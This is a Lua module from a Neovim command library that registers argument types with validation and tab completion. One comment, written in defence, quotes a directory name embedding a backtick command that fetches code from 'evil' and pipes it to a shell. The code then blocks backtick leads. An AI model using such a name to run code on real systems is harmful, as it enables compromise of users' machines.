---@module 'lib.nvim.bindings.usercmd.composer.argtypes'
--- Argument-type registry: each type carries BOTH validation and completion, so
--- a route's arg schema drives coercion (dispatch) and `<Tab>` (completion) from
--- one definition. Coercion reuses `lib.nvim.normalize.validators`; PATH/DIR/FILE
--- completion uses Neovim's own file completion so it is cross-platform.

local validators = require("lib.nvim.normalize.validators")
local is_dir = require("lib.nvim.fs.is_dir")
local expand_path = require("lib.nvim.cross.fs.expand_path")
local roots = require("lib.nvim.fs.roots")

local M = {}

---@type table<string, Lib.UserCmd.Composer.TypeDef>
local REGISTRY = {}

local prefix = require("lib.nvim.bindings.usercmd.prefix")
M.prefix = prefix

--- Register (or override) an argument type.
---@param name string
---@param def Lib.UserCmd.Composer.TypeDef
function M.register(name, def)
  assert(
    type(name) == "string" and name ~= "",
    "composer.argtypes: type name must be a non-empty string"
  )
  assert(
    type(def) == "table" and type(def.validate) == "function",
    "composer.argtypes: type def needs a validate(raw, spec) function"
  )
  REGISTRY[name] = def
end

--- Look up a type def; falls back to STRING for unknown names.
---@param name string|nil
---@return Lib.UserCmd.Composer.TypeDef
function M.get(name)
  return REGISTRY[name or "STRING"] or REGISTRY.STRING
end

--- Validate a raw token against an arg spec (honoring `enum` first).
---@param raw string
---@param spec Lib.UserCmd.Composer.TypedSpec
---@return boolean ok, any value, string|nil err
function M.validate(raw, spec)
  if spec.enum then
    -- Case-insensitive, normalizing to the canonical member — forgiving for
    -- hand-typed commands; completion still offers the exact-case members.
    local v = validators.to_enum(raw, spec.enum, true)
    if v == nil then
      return false, nil, ("expected one of %s"):format(table.concat(spec.enum, "|"))
    end
    return true, v, nil
  end
  return M.get(spec.type).validate(raw, spec)
end

--- Completion candidates for an arg spec (honoring `enum` first).
---
--- `cmd_line` is the whole command line as Neovim handed it to the completion
--- callback. Built-in types ignore it; a custom type that has to know what was
--- already typed before this slot (a nested router that dispatches on earlier
--- tokens, say) reads it instead of guessing from `arg_lead` alone. It is nil
--- when the caller has no command line to give: flag/kv *value* completion, and
--- direct calls from tests.
---@param arg_lead string
---@param spec Lib.UserCmd.Composer.TypedSpec
---@param cmd_line? string
---@return string[]
function M.complete(arg_lead, spec, cmd_line)
  if spec.enum then
    return prefix(spec.enum, arg_lead)
  end
  local def = M.get(spec.type)
  if def.complete then
    return def.complete(arg_lead, spec, cmd_line)
  end
  return {}
end

-- ── Built-in types ──────────────────────────────────────────────────────────

M.register("STRING", {
  validate = function(raw)
    return true, raw, nil
  end,
  complete = function(arg_lead, spec)
    return prefix(spec.values or {}, arg_lead)
  end,
})

M.register("INT", {
  validate = function(raw)
    local n = validators.to_int(raw)
    if n == nil then
      return false, nil, ("'%s' is not an integer"):format(raw)
    end
    return true, n, nil
  end,
})

M.register("FLOAT", {
  validate = function(raw)
    local n = validators.to_float(raw)
    if n == nil then
      return false, nil, ("'%s' is not a number"):format(raw)
    end
    return true, n, nil
  end,
})

local BOOL_WORDS = { "true", "false", "on", "off", "yes", "no" }
M.register("BOOL", {
  validate = function(raw)
    local b = validators.to_bool(raw)
    if b == nil then
      return false, nil, ("'%s' is not a boolean (true/false/on/off/yes/no)"):format(raw)
    end
    return true, b, nil
  end,
  complete = function(arg_lead)
    return prefix(BOOL_WORDS, arg_lead)
  end,
})

-- Path family. Validation is intentionally soft for PATH (accept any token —
-- the handler decides), strict for DIR/FILE. All three expand `~`, `$VAR`,
-- `${VAR}` and `%VAR%` before validating/returning, so e.g. `root=$REPOS_DIR`
-- resolves instead of failing "not a directory" on the literal token. A leading
-- reference to a named root (`lib.nvim.fs.roots`: `$NVIM_CONFIG_DIR`, an `extra`
-- root, ...) is resolved by the registry, also where no real environment
-- variable exists.
---@internal
--- Complete a path lead typed by the user -- or inserted by an earlier completion.
---
--- A lead naming a root (`${NAME}/x`, `$NAME/x`) is completed on its expansion, and every
--- candidate is handed back with the root reference as the user typed it (`${NAME}` or `$NAME`):
--- `getcompletion` itself understands neither `${NAME}` nor a root without an environment variable.
--- The rest is the filesystem's own spelling with `.` / `..` resolved, so a step out of the root
--- (`$NAME/..`) is not completed. A bare `$NA` completes the names of the known roots.
---
--- A backtick in the lead is a command substitution to Vim's wildcard expansion: a directory named
--- like "x`curl evil|sh`" in a downloaded folder would run its text the next time <Tab> is pressed
--- on it. Such a lead completes to nothing.
---@param arg_lead string
---@param kind "file"|"dir"
---@return string[]
local function path_completion(arg_lead, kind)
  if arg_lead:find("`", 1, true) then
    return {}
  end

  local partial = arg_lead:match("^%$([%w_]*)$")
  if partial then
    local out = {}
    for _, name in ipairs(roots.names()) do
      if name:lower():sub(1, #partial) == partial:lower() then
        out[#out + 1] = "$" .. name .. "/"
      end
    end
    if #out > 0 then
      return out
    end
  end

  local name, _, rest = roots.match(arg_lead)
  if name then
    local expanded = roots.expand(arg_lead)
    -- The root's own path is configuration, but the same backtick rule applies to it: it is the
    -- text handed to `getcompletion` here, not the lead.
    if expanded:find("`", 1, true) then
      return {}
    end
    local ok, list = pcall(vim.fn.getcompletion, expanded, kind)
    if not ok then
      return {}
    end
    local head = arg_lead:sub(1, #arg_lead - #rest)
    local out = {}
    for _, cand in ipairs(list) do
      -- `relative`, not a string-prefix test: `getcompletion` may answer with the other
      -- separator or another case than the root was spelled with.
      local below = roots.relative(cand, name)
      if below then
        out[#out + 1] = head .. below
      end
    end
    return out
  end

  local ok, list = pcall(vim.fn.getcompletion, arg_lead, kind)
  return ok and list or {}
end

M.register("PATH", {
  validate = function(raw)
    return true, expand_path(raw), nil
  end,
  complete = function(arg_lead)
    return path_completion(arg_lead, "file")
  end,
})

M.register("DIR", {
  validate = function(raw)
    local expanded = expand_path(raw)
    if not is_dir(vim.fn.fnamemodify(expanded, ":p")) then
      return false, nil, ("'%s' is not a directory"):format(raw)
    end
    return true, expanded, nil
  end,
  complete = function(arg_lead)
    return path_completion(arg_lead, "dir")
  end,
})

M.register("FILE", {
  validate = function(raw)
    local expanded = expand_path(raw)
    local p = vim.fn.fnamemodify(expanded, ":p")
    if vim.fn.filereadable(p) ~= 1 then
      return false, nil, ("'%s' is not a readable file"):format(raw)
    end
    return true, expanded, nil
  end,
  complete = function(arg_lead)
    return path_completion(arg_lead, "file")
  end,
})

M.register("BUFFER", {
  validate = function(raw)
    local n = validators.to_int(raw)
    if n and vim.api.nvim_buf_is_valid(n) then
      return true, n, nil
    end
    -- fall back to a name match
    for _, b in ipairs(vim.api.nvim_list_bufs()) do
      if vim.api.nvim_buf_is_loaded(b) then
        local name = vim.api.nvim_buf_get_name(b)
        if name ~= "" and name:find(raw, 1, true) then
          return true, b, nil
        end
      end
    end
    return false, nil, ("no buffer matching '%s'"):format(raw)
  end,
  complete = function(arg_lead)
    local out = {}
    for _, b in ipairs(vim.api.nvim_list_bufs()) do
      if vim.api.nvim_buf_is_loaded(b) then
        local name = vim.api.nvim_buf_get_name(b)
        if name ~= "" then
          out[#out + 1] = vim.fn.fnamemodify(name, ":t")
        end
      end
    end
    return prefix(out, arg_lead)
  end,
})

-- Window ids are opaque numbers nobody memorizes, so completion offers the
-- live ones. Bare ids only: a `1000 (init.lua)` candidate would complete the
-- annotation into the command line too, and every consumer would have to strip
-- it back off. Mirrors BUFFER above, minus the name fallback -- windows have
-- no names to match against.
M.register("WINDOW", {
  validate = function(raw)
    local n = validators.to_int(raw)
    if n and vim.api.nvim_win_is_valid(n) then
      return true, n, nil
    end
    return false, nil, ("'%s' is not a valid window id"):format(raw)
  end,
  complete = function(arg_lead)
    local out = {}
    for _, w in ipairs(vim.api.nvim_list_wins()) do
      out[#out + 1] = tostring(w)
    end
    return prefix(out, arg_lead)
  end,
})

return M
